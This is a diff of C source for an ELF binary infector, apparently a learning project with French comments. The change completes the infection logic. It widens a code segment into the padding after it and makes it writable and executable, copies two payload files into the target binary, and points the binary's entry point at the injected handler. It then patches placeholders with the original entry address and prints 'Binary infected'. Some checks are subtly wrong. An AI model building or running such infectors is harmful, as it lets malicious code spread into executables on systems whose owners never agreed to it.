@@ -9,22 +9,22 @@
 #include <errno.h>
 #include <fcntl.h>
 
-static Elf64_Addr   g_old_addr;   
+static Elf64_Addr   g_old_addr;
+static Elf64_Addr   g_handler_addr;
 static Elf64_Addr   g_parasite_addr;
 static Elf64_Off    g_parasite_off;
+static Elf64_Off    g_handler_off;
 static uint64_t     g_parasite_size;
 static uint64_t     g_payload_size;
 
 void calcul_payload(char **paths)
 {
-    int64_t size = 0;
     int verif = 0;
     for (int i = 0; paths[i]; i++)
     {
-        int fd = open(paths, O_RDONLY);
-        if(fd < 0)
+        int fd = open(paths[i], O_RDONLY);
+        if(fd == -1)
         {
-            close(fd);
             printf("Error, the source assembly file is not accesible\n");
             return ;
         }
@@ -35,8 +35,9 @@ void calcul_payload(char **paths)
             printf("Error, lseek function return an error\n");
             return ;
         }
-        else
-            size += verif;
+        if(i == 0)
+            g_parasite_size = verif;
+        g_payload_size += verif;
         close(fd);
     }
     return ;
@@ -52,7 +53,7 @@ int main(int argc, char **argv)
     int fd = open(argv[1], O_RDWR);
     if(fd < -1)
         return(printf("Error while opening the file\n"), 1);
-    char **paths = {"virus_test.bin", "handler_test.bin"};
+    char *paths[] = {"virus_test.bin", "handler_test.bin", NULL};
     calcul_payload(paths);
     if(!g_payload_size)
         return(printf("Error, payload issue\n"), 1);
@@ -71,7 +72,7 @@ int main(int argc, char **argv)
             seg_addr = phdr[i].p_vaddr;
             seg_offset = phdr[i].p_offset;
 
-            if(i < eh->e_phnum)
+            if(i + 1 < eh->e_phnum)
                 padding = phdr[i + 1].p_offset - (seg_offset + seg_size);
             if(padding < g_payload_size)
                 return(printf("Error, not possible to inject the code because not enought space\n"), 1);
@@ -80,24 +81,49 @@ int main(int argc, char **argv)
                 printf("Ajusting the size to fill\n");
                 phdr[i].p_filesz += g_payload_size;
                 phdr[i].p_memsz += g_payload_size;
-                phdr[i].p_flags |= PF_W;
+                phdr[i].p_flags = PF_W | PF_R | PF_X;
             }
             break;
         }
     }
     g_parasite_addr = seg_addr + seg_size;
     g_parasite_off = seg_offset + seg_size;
-    
+
+    g_handler_addr = g_parasite_addr + g_parasite_size;
+    g_handler_off = g_parasite_off + g_parasite_size;
     // Changer l'entry point //
-    //Elf64_Addr old_entry = eh->e_entry;
-    //if(eh->e_type == ET_EXEC)
-    //{
-    //    eh->e_entry = g_handler_addr; // ?
-    //}
-    //else
-    //{
-    //    eh->e_entry = g_handler_off; // ?
-    //}
+
+    Elf64_Addr old_entry = eh->e_entry;
+    eh->e_entry = g_handler_addr;
+
+    unsigned char *ptr_injection = (unsigned char *)base + g_parasite_off;
+
+    int vfd = open("virus_test.bin", O_RDONLY);
+    read(vfd, ptr_injection, g_parasite_size);
+    close(vfd);
+
+    vfd = open("handler_test.bin", O_RDONLY);
+    read(vfd, ptr_injection + g_parasite_size, g_payload_size - g_parasite_size);
+    close(vfd);
+
+    /* TEST */
+    // Utilise un pointeur unsigned char pour parcourir octet par octet
+    for (size_t i = 0; i <= g_payload_size - sizeof(uint64_t); i++) {
+        uint64_t *ptr = (uint64_t *)(ptr_injection + i);
+        if (*ptr == 0xAAAAAAAAAAAAAAAA) {
+            *ptr = old_entry;
+            printf("Old entry patched at offset %lu\n", i);
+        }
+        if (*ptr == 0xBBBBBBBBBBBBBBBB) {
+            *ptr = g_parasite_size;
+            printf("Parasite size patched at offset %lu\n", i);
+        }
+    }
+    /* TEST */
+
+    msync(base, size, MS_SYNC);
+    munmap(base, size);
+    printf("Binary infected\n");
     return(0);
 }
 
